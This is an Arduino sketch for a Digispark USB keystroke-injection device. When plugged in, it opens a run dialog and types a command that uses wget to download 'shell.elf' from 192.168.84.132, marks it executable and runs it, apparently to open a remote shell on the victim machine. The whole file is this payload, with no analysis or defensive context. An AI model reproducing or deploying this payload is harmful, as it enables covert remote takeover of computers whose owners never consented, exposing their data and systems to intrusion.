#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

void setup() {

DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("`wget http://192.168.84.132/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf&&/tmp/shell.elf`");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
void loop() {
}
